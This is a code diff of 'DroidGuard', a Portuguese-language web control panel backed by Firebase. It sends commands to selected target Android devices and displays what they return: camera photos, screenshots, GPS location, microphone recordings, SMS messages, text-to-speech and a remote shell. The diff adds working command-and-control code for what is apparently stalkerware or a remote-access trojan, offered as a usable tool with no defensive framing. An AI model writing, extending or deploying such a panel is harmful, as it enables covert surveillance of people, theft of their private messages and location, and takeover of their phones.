@@ -3,306 +3,118 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DroidGuard | Painel de Controle</title>
+    <title>DroidGuard - Central de Comando</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background: #0a0c0f;
-            font-family: 'Segoe UI', 'Poppins', sans-serif;
-            color: #eef2ff;
-            padding: 20px;
-        }
-
-        /* Header */
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            margin-bottom: 25px;
-            border-bottom: 1px solid #1f2a3a;
-            padding-bottom: 15px;
-        }
-
-        .logo h1 {
-            font-size: 1.7rem;
-            background: linear-gradient(135deg, #2f8e8b, #4fd1c5);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-
-        .logo p {
-            font-size: 0.8rem;
-            color: #7f8c8d;
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 20px;
-            flex-wrap: wrap;
-        }
-
-        .nav-links a {
-            color: #cbd5e6;
-            text-decoration: none;
-            font-weight: 500;
-            transition: 0.3s;
-        }
-
-        .nav-links a:hover {
-            color: #4fd1c5;
-        }
-
-        /* Grid principal */
-        .dashboard {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-            gap: 22px;
-            margin-top: 20px;
-        }
-
-        .card {
-            background: #0f1219;
-            border-radius: 24px;
-            padding: 18px;
-            border: 1px solid #1e2a36;
-            backdrop-filter: blur(2px);
-            transition: 0.2s;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
-        }
-
-        .card h3 {
-            font-size: 1.3rem;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            border-left: 4px solid #2f8e8b;
-            padding-left: 12px;
-        }
-
-        /* Câmeras lado a lado */
-        .cam-dual {
-            display: flex;
-            gap: 15px;
-            flex-wrap: wrap;
-        }
-
-        .cam-box {
-            flex: 1;
-            text-align: center;
-        }
-
-        .cam-box img {
-            width: 100%;
-            max-height: 200px;
-            object-fit: cover;
-            border-radius: 16px;
-            border: 1px solid #2f8e8b;
-            background: #000;
-        }
-
-        .cam-placeholder {
-            background: #1a1f2a;
-            padding: 40px;
-            border-radius: 16px;
-            color: #5a6e7c;
-            font-size: 0.9rem;
-        }
-
-        /* Tela ao vivo */
-        .screen-live {
-            background: #000000aa;
-            border-radius: 16px;
-            text-align: center;
-            padding: 15px;
-        }
-
-        .screen-live img {
-            width: 100%;
-            border-radius: 12px;
-            background: #0a0c10;
-            min-height: 180px;
-        }
-
-        /* Botões de comando */
-        .cmd-buttons {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 12px;
-            margin-top: 15px;
-        }
-
-        .cmd-btn {
-            background: #1e2a36;
-            border: none;
-            padding: 10px 16px;
-            border-radius: 40px;
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.2s;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 0.85rem;
-        }
-
-        .cmd-btn i {
-            font-size: 1rem;
-        }
-
-        .cmd-btn:hover {
-            background: #2f8e8b;
-            transform: scale(1.02);
-        }
-
-        .danger-btn {
-            background: #9b2c2c;
-        }
-        .danger-btn:hover {
-            background: #c0392b;
-        }
-
-        /* Lista de mensagens */
-        .msg-list {
-            list-style: none;
-            margin-top: 10px;
-        }
-        .msg-list li {
-            background: #0b0e14;
-            margin: 8px 0;
-            padding: 10px;
-            border-radius: 14px;
-            border-left: 3px solid #2f8e8b;
-            font-size: 0.85rem;
-        }
-        .msg-time {
-            font-size: 0.7rem;
-            color: #7e8c8f;
-            display: block;
-        }
-
-        .badge {
-            background: #2f8e8b20;
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-size: 0.75rem;
-        }
-
-        @media (max-width: 700px) {
-            .header {
-                flex-direction: column;
-                gap: 12px;
-            }
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0c0f; font-family: 'Segoe UI', sans-serif; color: #eef2ff; padding: 20px; }
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; }
+        .logo h1 { background: linear-gradient(135deg, #2f8e8b, #4fd1c5); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        .device-selector { background: #1a1f2a; padding: 15px; border-radius: 12px; margin-bottom: 20px; }
+        select, button { background: #2f8e8b; border: none; padding: 10px 20px; border-radius: 8px; color: white; margin: 5px; cursor: pointer; }
+        select { background: #1e2a36; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; }
+        .card { background: #0f1219; border-radius: 20px; padding: 20px; border: 1px solid #1e2a36; }
+        .card h3 { margin-bottom: 15px; border-left: 4px solid #2f8e8b; padding-left: 12px; }
+        button { transition: 0.2s; }
+        button:hover { transform: scale(1.02); background: #3fa39f; }
+        .cmd-group { display: flex; flex-wrap: wrap; gap: 10px; margin: 15px 0; }
+        .result-img { max-width: 100%; border-radius: 12px; margin-top: 10px; background: #000; }
+        .result-audio audio { width: 100%; margin-top: 10px; }
+        .sms-list { max-height: 300px; overflow-y: auto; }
+        .sms-item { background: #1a1f2a; padding: 10px; margin: 8px 0; border-radius: 8px; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; z-index: 1000; }
+        .modal-content { background: #1a1f2a; padding: 30px; border-radius: 20px; max-width: 500px; width: 90%; }
+        input, textarea { width: 100%; padding: 10px; margin: 10px 0; border-radius: 8px; border: none; background: #0d1418; color: white; }
+        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid #fff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .online { color: #2ecc71; }
+        .offline { color: #e74c3c; }
     </style>
 </head>
 <body>
-
 <div class="header">
-    <div class="logo">
-        <h1><i class="fas fa-shield-alt"></i> DroidGuard</h1>
-        <p>Monitoramento avançado · Comando remoto</p>
+    <div class="logo"><h1><i class="fas fa-shield-alt"></i> DroidGuard</h1><p>Central de Comando Remoto</p></div>
+    <div><i class="fas fa-database"></i> Firebase Real-time</div>
+</div>
+
+<div class="device-selector">
+    <i class="fas fa-mobile-alt"></i> Dispositivo Alvo:
+    <select id="deviceSelect" onchange="mudarDispositivo()">
+        <option value="">Selecione um dispositivo...</option>
+    </select>
+    <button onclick="refreshDevices()"><i class="fas fa-sync-alt"></i> Atualizar</button>
+    <span id="deviceStatus" style="margin-left: 15px;"></span>
+</div>
+
+<div class="grid">
+    <!-- Câmeras -->
+    <div class="card">
+        <h3><i class="fas fa-camera"></i> Câmeras</h3>
+        <div class="cmd-group">
+            <button onclick="enviarComando('foto_frontal')"><i class="fas fa-camera"></i> Foto Frontal</button>
+            <button onclick="enviarComando('foto_traseria')"><i class="fas fa-camera-retro"></i> Foto Traseira</button>
+        </div>
+        <div id="fotoResultado"></div>
     </div>
-    <div class="nav-links">
-        <a href="#"><i class="fas fa-tachometer-alt"></i> Início</a>
-        <a href="#"><i class="fas fa-mobile-alt"></i> Dispositivos</a>
-        <a href="#"><i class="fas fa-map-marker-alt"></i> Mapas</a>
-        <a href="#"><i class="fas fa-history"></i> Histórico</a>
-        <a href="#"><i class="fas fa-folder"></i> Arquivos</a>
+
+    <!-- Tela -->
+    <div class="card">
+        <h3><i class="fas fa-desktop"></i> Captura de Tela</h3>
+        <button onclick="enviarComando('screenshot')"><i class="fas fa-image"></i> Capturar</button>
+        <div id="screenResultado"></div>
+    </div>
+
+    <!-- Localização -->
+    <div class="card">
+        <h3><i class="fas fa-map-marker-alt"></i> Localização GPS</h3>
+        <button onclick="enviarComando('gps')"><i class="fas fa-location-dot"></i> Pegar Localização</button>
+        <div id="gpsResultado"></div>
+    </div>
+
+    <!-- Áudio -->
+    <div class="card">
+        <h3><i class="fas fa-microphone"></i> Gravação</h3>
+        <div class="cmd-group">
+            <button onclick="enviarComando('gravar_audio', {duracao: 5})">5 segundos</button>
+            <button onclick="enviarComando('gravar_audio', {duracao: 10})">10 segundos</button>
+            <button onclick="enviarComando('gravar_audio', {duracao: 30})">30 segundos</button>
+        </div>
+        <div id="audioResultado"></div>
+    </div>
+
+    <!-- SMS -->
+    <div class="card">
+        <h3><i class="fas fa-envelope"></i> Mensagens SMS</h3>
+        <button onclick="enviarComando('listar_sms')"><i class="fas fa-list"></i> Listar SMS</button>
+        <div id="smsResultado" class="sms-list"></div>
+    </div>
+
+    <!-- Ações -->
+    <div class="card">
+        <h3><i class="fas fa-mobile"></i> Ações Rápidas</h3>
+        <button onclick="enviarComando('vibrar', {duracao: 1000})"><i class="fas fa-bell"></i> Vibrar</button>
+        <button onclick="abrirModalFalar()"><i class="fas fa-volume-up"></i> Falar</button>
+        <button onclick="enviarComando('bateria')"><i class="fas fa-battery-full"></i> Ver Bateria</button>
+    </div>
+
+    <!-- Shell Remoto -->
+    <div class="card">
+        <h3><i class="fas fa-terminal"></i> Shell Remoto</h3>
+        <input type="text" id="shellCmd" placeholder="Comando Linux/Android...">
+        <button onclick="executarShell()"><i class="fas fa-play"></i> Executar</button>
+        <pre id="shellResultado" style="background:#000; padding:10px; border-radius:8px; margin-top:10px; max-height:200px; overflow:auto;"></pre>
     </div>
 </div>
 
-<div class="dashboard">
-    
-    <!-- Câmera frontal + traseira -->
-    <div class="card">
-        <h3><i class="fas fa-camera"></i> Câmera Frontal</h3>
-        <div class="cam-box">
-            <img id="camFront" src="" alt="Frontal">
-        </div>
-        <h3 style="margin-top: 15px;"><i class="fas fa-camera-retro"></i> Câmera Traseira</h3>
-        <div class="cam-box">
-            <img id="camRear" src="" alt="Traseira">
-            <div class="cmd-buttons">
-                <button class="cmd-btn" onclick="sendCmd('photo_front')"><i class="fas fa-camera"></i> Tirar Foto (Frontal)</button>
-                <button class="cmd-btn" onclick="sendCmd('photo_rear')"><i class="fas fa-camera"></i> Foto (Traseira)</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Visualização de tela ao vivo -->
-    <div class="card">
-        <h3><i class="fas fa-desktop"></i> Visualização de Tela ao Vivo</h3>
-        <div class="screen-live">
-            <img id="screenLive" src="" alt="Screen capture">
-            <div class="cmd-buttons">
-                <button class="cmd-btn" onclick="sendCmd('screenshot')"><i class="fas fa-image"></i> Capturar Tela</button>
-                <button class="cmd-btn" onclick="sendCmd('start_stream')"><i class="fas fa-play-circle"></i> Iniciar Stream (5s)</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Localização GPS recente + mapa estático -->
-    <div class="card">
-        <h3><i class="fas fa-map-pin"></i> Localização GPS Recente</h3>
-        <div id="gpsInfo" style="margin-bottom: 8px;">
-            <span class="badge"><i class="fas fa-sync-alt"></i> Aguardando dados...</span>
-        </div>
-        <iframe id="staticMap" width="100%" height="200" style="border-radius: 16px; border:0;" loading="lazy" 
-            src="https://maps.google.com/maps?q=-23.5505,-46.6333&z=12&output=embed"></iframe>
-        <div class="cmd-buttons">
-            <button class="cmd-btn" onclick="sendCmd('get_location')"><i class="fas fa-location-dot"></i> Atualizar GPS</button>
-        </div>
-    </div>
-
-    <!-- Últimas Mensagens (SMS/WhatsApp mock + comandos) -->
-    <div class="card">
-        <h3><i class="fas fa-comment-dots"></i> Últimas Mensagens</h3>
-        <ul class="msg-list" id="messageList">
-            <li><span class="msg-time">Aman · 13h atrás</span><br>Peter: últimas mensagens estão à caminho...</li>
-            <li><span class="msg-time">Elka Maria · 12h atrás</span><br>Percebi suas mensagens, sem depoimento ainda!</li>
-            <li><span class="msg-time">Alra · 13h atrás</span><br>Mensagem tensa? Transmita autorização?</li>
-            <li><span class="msg-time">Aliva Santo · 17h atrás</span><br>Deixa eu ver a última mensagem certa</li>
-        </ul>
-        <div class="cmd-buttons">
-            <button class="cmd-btn" onclick="sendCmd('fetch_sms')"><i class="fas fa-envelope"></i> Buscar SMS</button>
-            <button class="cmd-btn" onclick="sendCmd('fetch_whatsapp')"><i class="fab fa-whatsapp"></i> Buscar WhatsApp</button>
-        </div>
-    </div>
-
-    <!-- Comandos rápidos (voz, vibrar, gravar) -->
-    <div class="card">
-        <h3><i class="fas fa-terminal"></i> Comandos Remotos</h3>
-        <div class="cmd-buttons">
-            <button class="cmd-btn" onclick="sendCmd('vibrate')"><i class="fas fa-mobile"></i> Vibrar</button>
-            <button class="cmd-btn" onclick="sendCmd('record', '15')"><i class="fas fa-microphone"></i> Gravar Áudio (15s)</button>
-            <button class="cmd-btn" onclick="openVoiceModal()"><i class="fas fa-volume-up"></i> Falar no dispositivo</button>
-            <button class="cmd-btn danger-btn" onclick="sendCmd('alert', 'ALERTA')"><i class="fas fa-exclamation-triangle"></i> Alerta Remoto</button>
-        </div>
-        <div style="margin-top: 15px;">
-            <label>🔋 Bateria: <strong id="batteryLevel">--</strong>%</label>
-            <progress id="batteryBar" value="0" max="100" style="width:100%; height:12px; border-radius:20px;"></progress>
-        </div>
-    </div>
-</div>
-
-<!-- Modal para comando de voz -->
-<div id="voiceModal" style="display:none; position:fixed; background:#0a0c10dd; backdrop-filter:blur(6px); top:0; left:0; width:100%; height:100%; justify-content:center; align-items:center; z-index:1000;">
-    <div style="background:#141c24; padding:30px; border-radius:32px; width:90%; max-width:380px;">
-        <h3>🗣️ Falar no Celular</h3>
-        <input type="text" id="voiceText" placeholder="Digite a mensagem..." style="width:100%; padding:12px; margin:15px 0; border-radius:24px; border:none;">
-        <div style="display:flex; gap:12px;">
-            <button onclick="sendCmd('speak', document.getElementById('voiceText').value); closeVoiceModal();" class="cmd-btn" style="flex:1">Enviar</button>
-            <button onclick="closeVoiceModal();" class="cmd-btn" style="background:#3a3f4b;">Cancelar</button>
+<!-- Modal Falar -->
+<div id="modalFalar" class="modal">
+    <div class="modal-content">
+        <h3><i class="fas fa-volume-up"></i> Falar no Dispositivo</h3>
+        <input type="text" id="textoFalar" placeholder="Digite o texto para falar...">
+        <div class="cmd-group">
+            <button onclick="enviarComando('falar', {texto: document.getElementById('textoFalar').value}); fecharModalFalar()">Enviar</button>
+            <button onclick="fecharModalFalar()">Cancelar</button>
         </div>
     </div>
 </div>
@@ -310,83 +122,144 @@
 <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
 <script>
-    // Configuração do Firebase (igual ao seu monitor.py)
-    const firebaseConfig = {
-        databaseURL: "https://droidguard-10597-default-rtdb.firebaseio.com/"
-    };
+    const firebaseConfig = { databaseURL: "https://droidguard-10597-default-rtdb.firebaseio.com/" };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-
-    // Função para enviar comandos
-    function sendCmd(action, value = "") {
-        db.ref('commands').set({
-            action: action,
-            value: value,
-            timestamp: Date.now()
+    
+    let deviceAtual = null;
+    
+    // Monitorar dispositivos online
+    function refreshDevices() {
+        db.ref('dispositivos').once('value', (snapshot) => {
+            const devices = snapshot.val() || {};
+            const select = document.getElementById('deviceSelect');
+            select.innerHTML = '<option value="">Selecione um dispositivo...</option>';
+            
+            for (let id in devices) {
+                const device = devices[id];
+                const status = device.status === 'online' ? '🟢' : '🔴';
+                const option = document.createElement('option');
+                option.value = id;
+                option.textContent = `${status} ${id} - Bateria: ${device.bateria ? JSON.parse(device.bateria).percentage : '?'}%`;
+                select.appendChild(option);
+            }
         });
-        console.log(`Comando enviado: ${action} / ${value}`);
-        // Feedback visual simples
-        const btn = event?.target;
-        if(btn && btn.classList) {
-            const original = btn.innerText;
-            btn.innerText = "✅ Enviado!";
-            setTimeout(() => btn.innerText = original, 1000);
-        } else {
-            alert(`Comando "${action}" enviado!`);
+    }
+    
+    function mudarDispositivo() {
+        deviceAtual = document.getElementById('deviceSelect').value;
+        if(deviceAtual) {
+            // Monitorar status do dispositivo
+            db.ref(`dispositivos/${deviceAtual}`).on('value', (snap) => {
+                const d = snap.val();
+                if(d) {
+                    const statusSpan = document.getElementById('deviceStatus');
+                    statusSpan.innerHTML = d.status === 'online' ? '<span class="online">🟢 Online</span>' : '<span class="offline">🔴 Offline</span>';
+                    if(d.bateria) {
+                        const bat = JSON.parse(d.bateria);
+                        statusSpan.innerHTML += ` | 🔋 ${bat.percentage}%`;
+                    }
+                }
+            });
         }
     }
-
-    // Modal de voz
-    function openVoiceModal() {
-        document.getElementById('voiceModal').style.display = 'flex';
+    
+    async function enviarComando(acao, params = {}) {
+        if(!deviceAtual) {
+            alert('Selecione um dispositivo primeiro!');
+            return;
+        }
+        
+        const comandoId = Date.now().toString();
+        const comando = { acao, params, timestamp: Date.now() };
+        
+        // Enviar comando
+        await db.ref(`comandos/${deviceAtual}/${comandoId}`).set(comando);
+        
+        // Aguardar resultado
+        const resultadoRef = db.ref(`resultados/${deviceAtual}/${comandoId}`);
+        
+        resultadoRef.once('value', (snap) => {
+            const resultado = snap.val();
+            if(resultado) {
+                exibirResultado(acao, resultado);
+            }
+        });
+        
+        // Timeout
+        setTimeout(() => {
+            resultadoRef.off();
+        }, 30000);
     }
-    function closeVoiceModal() {
-        document.getElementById('voiceModal').style.display = 'none';
-    }
-
-    // Atualiza dashboard com dados vindos do dispositivo (device_status)
-    db.ref('device_status').on('value', (snapshot) => {
-        const data = snapshot.val();
-        if(!data) return;
-
-        // Fotos das câmeras (base64)
-        if(data.photo_front) {
-            document.getElementById('camFront').src = "data:image/jpeg;base64," + data.photo_front;
+    
+    function exibirResultado(acao, resultado) {
+        console.log('Resultado:', acao, resultado);
+        
+        if(acao === 'foto_frontal' || acao === 'foto_traseria') {
+            const div = document.getElementById('fotoResultado');
+            div.innerHTML = `<img src="data:image/jpeg;base64,${resultado.foto}" class="result-img">`;
         }
-        if(data.photo_rear) {
-            document.getElementById('camRear').src = "data:image/jpeg;base64," + data.photo_rear;
+        else if(acao === 'screenshot') {
+            const div = document.getElementById('screenResultado');
+            div.innerHTML = `<img src="data:image/png;base64,${resultado.screen}" class="result-img">`;
         }
-        if(data.screenshot) {
-            document.getElementById('screenLive').src = "data:image/jpeg;base64," + data.screenshot;
+        else if(acao === 'gps') {
+            const div = document.getElementById('gpsResultado');
+            div.innerHTML = `<iframe width="100%" height="250" frameborder="0" style="border-radius:12px" 
+                src="https://maps.google.com/maps?q=${resultado.latitude},${resultado.longitude}&z=15&output=embed"></iframe>
+                <p>📍 ${resultado.latitude}, ${resultado.longitude}</p>`;
         }
-        // Bateria
-        if(data.battery_level !== undefined) {
-            const bat = data.battery_level;
-            document.getElementById('batteryLevel').innerText = bat;
-            document.getElementById('batteryBar').value = bat;
+        else if(acao === 'gravar_audio' && resultado.audio) {
+            const div = document.getElementById('audioResultado');
+            div.innerHTML = `<audio controls src="data:audio/aac;base64,${resultado.audio}"></audio>`;
         }
-        // Localização
-        if(data.latitude && data.longitude) {
-            const lat = data.latitude;
-            const lng = data.longitude;
-            const mapUrl = `https://maps.google.com/maps?q=${lat},${lng}&z=14&output=embed`;
-            document.getElementById('staticMap').src = mapUrl;
-            document.getElementById('gpsInfo').innerHTML = `<span class="badge"><i class="fas fa-map-marker-alt"></i> Lat: ${lat} | Lng: ${lng}</span>`;
-        }
-        // Mensagens (se vier array)
-        if(data.messages && Array.isArray(data.messages)) {
-            const msgContainer = document.getElementById('messageList');
-            msgContainer.innerHTML = data.messages.map(msg => 
-                `<li><span class="msg-time">${msg.time || 'agora'}</span><br>${msg.sender || '?'}: ${msg.text}</li>`
+        else if(acao === 'listar_sms' && resultado.sms) {
+            const div = document.getElementById('smsResultado');
+            div.innerHTML = resultado.sms.map(s => 
+                `<div class="sms-item"><strong>📱 ${s.numero}</strong><br>${s.texto}<br><small>${s.data}</small></div>`
             ).join('');
         }
-    });
-
-    // Simulação de boas-vindas: comando inicial para pedir status
-    window.onload = () => {
-        console.log("DroidGuard Painel Ativo");
-        sendCmd('status_request');
-    };
+        else if(acao === 'bateria') {
+            alert(`Bateria: ${resultado.nivel}% - Status: ${resultado.status}`);
+        }
+        else if(acao === 'falar') {
+            alert('✅ Comando de voz enviado!');
+        }
+        else if(acao === 'vibrar') {
+            alert('📳 Vibração enviada!');
+        }
+    }
+    
+    async function executarShell() {
+        const cmd = document.getElementById('shellCmd').value;
+        if(!cmd) return;
+        await enviarComando('shell', {cmd: cmd});
+        
+        // Aguardar resultado específico
+        if(deviceAtual) {
+            const comandoId = Date.now().toString();
+            await db.ref(`comandos/${deviceAtual}/${comandoId}`).set({acao: 'shell', params: {cmd: cmd}, timestamp: Date.now()});
+            
+            db.ref(`resultados/${deviceAtual}/${comandoId}`).once('value', (snap) => {
+                const r = snap.val();
+                if(r) {
+                    document.getElementById('shellResultado').textContent = r.stdout || r.stderr || 'Sem saída';
+                }
+            });
+        }
+    }
+    
+    function abrirModalFalar() {
+        document.getElementById('modalFalar').style.display = 'flex';
+    }
+    
+    function fecharModalFalar() {
+        document.getElementById('modalFalar').style.display = 'none';
+    }
+    
+    // Atualizar a cada 5 segundos
+    refreshDevices();
+    setInterval(refreshDevices, 5000);
 </script>
 </body>
 </html>
